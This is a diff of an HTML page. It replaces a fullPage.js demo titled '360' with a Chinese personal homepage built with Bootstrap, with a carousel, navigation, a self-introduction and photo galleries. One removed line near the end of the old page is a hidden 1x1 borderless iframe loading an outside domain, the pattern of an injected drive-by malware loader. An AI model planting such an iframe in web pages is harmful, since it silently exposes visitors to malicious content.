@@ -1,108 +1,259 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN" manifest="02.appcache">
 <head>
-	<meta charset="UTF-8">
-	<title>360</title>
-	<link rel="stylesheet" href="./css/main.css">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
+    <title>My web</title>
+    <link rel="icon"  href="images/favicon.ico"/>
+
+    <!-- Bootstrap -->
+    <link href="lib/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!-- hack -->
+    <!--[if lt IE 9]>
+      <script src="//cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- 导入 自己的css -->
+	<link rel="stylesheet"  type="text/css" href="css/base.css" />
+    
+
+    <!-- 导入 index.css -->
+    <link rel="stylesheet" type="text/css" href="css/index.css">
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<script src="lib/js/jquery.min.js"></script>
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<script src="lib/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/index.js"> </script> 
+
+
 </head>
+
 <body>
-	<div id="fullpage">
-		<!-- 第一屏 -->
-		<div class="section first">
-			<!-- LOGO -->
-			<div class="logo"></div>
-			<!-- 文字 -->
-			<div class="text">
-				<img src="./images/text_1.png" alt="">
-				<img src="./images/text_2.png" alt="">
-				<img src="./images/text_3.png" alt="">
-				<img src="./images/text_4.png" alt="">
-				<img src="./images/text_5.png" alt="">
-				<img src="./images/text_6.png" alt="">
-				<img src="./images/text_7.png" alt="">
-				<img src="./images/text_8.png" alt="">
+	<div class="my-demo">
+		<div class="nva1">
+						<!--头部-->	
+		<header class="header">
+			<!--seach 搜索栏-->
+			<div class="search ">
+				<a href="" class="icon_logo" ></a>
+				<form action="" method="post">
+					<input type="search" placeholder="提示站位"/>
+					<p class="icon_p"></p>
+				</form>
+				<a href="" class="a1">搜索</a>
 			</div>
-			<!-- 信息 -->
-			<div class="info"></div>
-		</div>
-		<!-- 第二屏 -->
-		<div class="section second">
-			<!-- 盾牌 -->
-			<div class="shield">
-				<img src="./images/shield_1.png" alt="">
-				<img src="./images/shield_2.png" alt="">
-				<img src="./images/shield_3.png" alt="">
-				<img src="./images/shield_4.png" alt="">
-				<img src="./images/shield_5.png" alt="">
-				<img src="./images/shield_6.png" alt="">
-				<img src="./images/shield_7.png" alt="">
-				<img src="./images/shield_8.png" alt="">
-				<img src="./images/shield_9.png" alt="">
-			</div>
-			<!-- 信息 -->
-			<div class="info"></div>
-		</div>
-		<!-- 第三屏 -->
-		<div class="section third">
-			<!-- 信息 -->
-			<div class="info"></div>
-			<!-- 圆环 -->
-			<div class="circle"></div>
-			<!-- 火箭 -->
-			<div class="rocket"></div>
-		</div>
-		<!-- 第四屏 -->
-		<div class="section fourth">
-			<!-- 搜索 -->
-			<div class="search">
-				<div class="key"></div>
-				<div class="input"></div>
-				<div class="wrap">
-					<div class="result"></div>
-				</div>
-			</div>
-			<!-- 信息 -->
-			<div class="info"></div>
-		</div>
-		<!-- 第五屏 -->
-		<div class="section fifth">
-			<!-- 信息 -->
-			<div class="info"></div>
-			<!-- 浏览器 -->
-			<div class="broswer">
-				<!-- 四边框 -->
-				<div class="leftline"></div>
-				<div class="topline"></div>
-				<div class="rightline"></div>
-				<div class="bottomline"></div>
-				<!-- 工具栏 -->
-				<div class="toolbar"></div>
-				<!-- 边框盒子 -->
-				<div class="box">
-					<span></span>
-				</div>
-				<div class="line"></div>
-				<!-- 其它 -->
-				<div class="extra"></div>
-			</div>
-		</div>
-	</div>
-	<script src="./js/jquery.min.js"></script>
-	<script src="./js/jquery.fullPage.min.js"></script>
-	<script>
-		$('#fullpage').fullpage({
-			// 设置背景色
-			sectionsColor : ['#0da5d6', '#2AB561', '#DE8910', '#16BA9D', '#0DA5D6'],
-			afterLoad: function (anchorLink, index) {
-				$('.section').removeClass('current');
+		</header>
+			<!--轮播图-->
+		<div class="banner">
+			<div id="carousel-example-generic" class="carousel slide " data-ride="carousel">
+				  <!-- Indicators -->
+				  <ol class="carousel-indicators">
+				    <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
+				    <li data-target="#carousel-example-generic" data-slide-to="1"></li>
+				    <li data-target="#carousel-example-generic" data-slide-to="2"></li>
+				    <li data-target="#carousel-example-generic" data-slide-to="3"></li>				   
+				  </ol>	
+				   	<div class="wx" id="wx">
+						<div class="wx_car">
+						<img src="images/wx.jpg"/>
+						</div>
+			 		</div>
+				  <!-- Wrapper for slides -->
+				  <div class="carousel-inner " role="listbox">
+				    <div class="item active ">
+				      <a href="#" class="banner_a img_a  hidden-xs">
+				      </a>
+				      <!--小视口-->
+				      <a href="#" class="mobile_a hidden-sm hidden-md  hidden-lg ">
+				      	<img src="images/slide_01_2000x410.jpg" alt=""  />
+				      </a>
+				      <div class="carousel-caption">
+					    <h3>Hello,我是陈大捷</h3>
+					    <p>欢迎来到我的世界</p>
+					  </div>
+
+				    </div>
+				    <div class="item ">
+				      <a href="#" class="banner_a img_b hidden-xs">
+				      </a>
+				         <!--小视口-->
+				      <a href="#" class="mobile_a hidden-sm hidden-md  hidden-lg ">
+				      	<img src="images/slide_02_2000x410.jpg" alt=""  />
+				      </a>
+				       <div class="carousel-caption">
+					    <h3>家乡的美景</h3>
+					  </div>
+				    </div>
+				    <div class="item">
+				      <a href="#" class="banner_a img_c  hidden-xs">
+				      </a>
+				         <!--小视口-->
+				      <a href="#" class="mobile_a hidden-sm hidden-md  hidden-lg ">
+				      	<img src="images/slide_03_2000x410.jpg" alt=""  />
+				      </a>
+				       <div class="carousel-caption">
+					    <h3>自由的航行</h3>
+					  </div>
+				    </div>
+				    <div class="item ">
+				      <a href="#" class="banner_a img_d  hidden-xs">
+				      </a>
+				         <!--小视口-->
+				      <a href="#" class="mobile_a hidden-sm hidden-md  hidden-lg ">
+				      	<img src="images/slide_04_2000x410.jpg" alt=""/>
+				      </a>
+				       <div class="carousel-caption">
+					    <h3>My home</h3>
+
+					  </div>
+				    </div>
+				    			   
+				  </div>
 				
-				// 延时100毫秒执行
-				setTimeout(function () {
-					$('.section').eq(index - 1).addClass('current');
-				}, 100);
-			}
-		});
-	</script>
-<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+				  <!-- Controls -->
+				  <a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
+				    <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+				    <span class="sr-only">Previous</span>
+				  </a>
+				  <a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
+				    <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+				    <span class="sr-only">Next</span>
+				  </a>				 
+			</div>
+			
+		</div>
+		<!--导航栏-->
+		<div class="dh hidden-xs hidden-sm">
+			<ul class="dh-ul">
+		    <li class="col-sm--3 dh-ul-li">
+		        <span class="left"></span>
+		        <span class="center"><a href="#bk">个人播客</a></span>
+		        <span class="right"></span>
+		    </li>
+		    <li class="col-sm--3 dh-ul-li">
+		        <span class="left"></span>
+		        <span class="center"><a href="#mj">旅游美景</a></span>
+		        <span class="right"></span>
+		    </li>
+		    <li class="col-sm--3 dh-ul-li">
+		        <span class="left"></span>
+		        <span class="center"><a href="#jx">家乡的美景</a></span>
+		        <span class="right"></span>
+		    </li>
+		    <li class="col-sm--3 dh-ul-li">
+		        <span class="left"></span>
+		        <span class="center"><a href="http://www.w3school.com.cn/">技术文档</a></span>
+		        <span class="right"></span>
+		    </li> 
+		    <li class="col-sm--3 dh-ul-li js">
+		        <span class="left"></span>
+		         <span class="center"><a href="#">联系方式</a></span>
+		        <span class="right"></span>
+		    </li> 
+		</ul>
+		</div>
+		<!--小屏幕-->
+		<div class="container-fluid dh2 hidden-lg hidden-md">
+			<div class="row">
+				<div class="dh-active" ><a href="#bk">个人播客</a></div>
+				<div ><a href="#mj">旅游美景</a></div>
+				<div ><a href="#jx">家乡美景</a></div>
+				<div ><a href="http://www.w3school.com.cn/">技术文档</a></div>
+				<div class="js"><a href="#">联系方式</a></div>			
+		    </div>
+		</div>
+				
+  	    <!--nav个人博客说明-->
+  	     <div class="box" id="bk">
+  	    	<div class="box_top bj">
+  	    		<div class="box_l clearfix">
+  	    			<span class="glyphicon glyphicon-tags"></span>
+  	    			<p>个人博客</p>
+  	    		</div>
+  	    		<div class="div_r glyphicon glyphicon-remove-circle" id="hidd"></div>
+  	    	</div>
+  	    	<div class="box_buttom ph">
+  	    		<div class="h">
+	  	    		<h2 >我是陈大捷</h2>
+	  	    		<h3 >欢迎走进我的世界</h3>
+					<h4 >本人是一名90后草根，毕业广东岭南职业技术学院数控技术专业，乐于交友的我，不断在学校积累人际。不断扩充的知识范围，也希望和大家能一起技术交流。</h4>
+					<h3 >逻辑思维</h3>
+					<h4 >我喜欢挑战，作为理科生的我，喜欢逻辑性强,有挑战性的工作，而编程恰好充满挑战性，因此我选择了web前端，在过去的时间里我先后学习了HTML、CSS、Javascript、HTML5+CSS3、Bootstrap、jQuery、AngularJS等编程语言与框架，我还在学习新知识，比如nodejs，在未来的时间里，我相信会学的更好！</h4>
+					<h4 >你现在正在浏览我的个人主页，在未来的时间里，我想每年彻底更新和开发一次，以展示在过去一年中学习到的相关新知识</h4>
+  	    		</div>  	    		
+  	    	</div>
+  	    </div>
+  	    <!--旅游美景-->
+  	    <div class="box" id="mj">
+  	    	<div class="box_top bj">
+  	    		<div class="box_l">
+  	    			<span class="glyphicon glyphicon-flag"></span>
+  	    			<p>旅游美景</p>
+  	    		</div>
+  	    		<div class="box_r"><a href="">更多>></a></div>
+  	    	</div>
+  	    	<div class="box_buttom">
+					<ul class='clearfix'>
+						<li class='f_l'><img src="images/slide_02_2000x410 (2).jpg" alt="" class="img-thumbnail"></li>
+						<li class='f_l'><img src="images/slide_03_2000x410 (2).jpg" alt="" class="img-circle"></li>
+						<li class='f_l'><img src="images/Mj-3.jpg" alt="" class="img-thumbnail"></li>
+					</ul>
+					<ul class='clearfix'>
+						<li class='f_l'><img src="images/Mj-1.jpg" alt="" class="img-thumbnail"></li>
+						<li class='f_l'><img src="images/Mj-2.jpg" alt="" class="img-thumbnail"></li>
+						<li class='f_l'><img src="images/detail01.jpg" alt="" class="img-thumbnail"></li>
+					</ul>
+  	    	</div>
+  	    </div>
+  	    <!--家乡美景-->
+  	      <div class="box" id="jx">
+  	    	<div class="box_top box_top1">
+  	    		<div class="box_l">
+  	    			<span class="glyphicon glyphicon-flag"></span>
+  	    			<p>家乡美景</p>
+  	    		</div>
+  	    		<div class="box_r"><a href="">更多>></a></div>
+  	    	</div>
+  	    	<div class="top1_buttom ">
+					<ul class='clearfix'>
+						<li class='f_l jx_l '><img src="images/zj-1.png" alt="" class="img-thumbnail"></li>
+						<li class='f_r jx_r'><img src="images/zj-2.jpg" alt="" class="img-thumbnail"></li>
+						<li class='f_l jx_l'><img src="images/zj-3.jpg" alt="" class="img-thumbnail"></li>
+					</ul>				
+  	    	</div>
+  	    </div>
+  	         <!--页脚-->
+  	    <footer>
+  	    	<div class="footer">
+  	    		<div class="footer-buttom">
+  	    			<div class="footer_box">
+	  	    			<p > 联系方式：</p>
+	  	    			<span class="glyphicon glyphicon-comment">
+	  	    			<span class="glyphicon glyphicon-envelope"></span>
+	  	    			<span class="glyphicon glyphicon-qrcode"></span>
+	  	    			<span class="glyphicon glyphicon-pencil"></span>
+	  	    			<span class="glyphicon glyphicon-phone-alt"></span>
+  	    			</div> 	    			
+  	    		</div>
+  	    		<div class="footer-top">
+  	    			<p><span class="glyphicon glyphicon-star"></span>以上有不足之处请多多指点</p>
+  	    			<p><span class="glyphicon glyphicon-user"></span>欢迎技术交流</p>
+  	    		</div>
+  	    		
+  	    	</div>
+  	    </footer>    
+  	         	          
+		</div>
+
+</div>
+
 </body>
+
 </html>
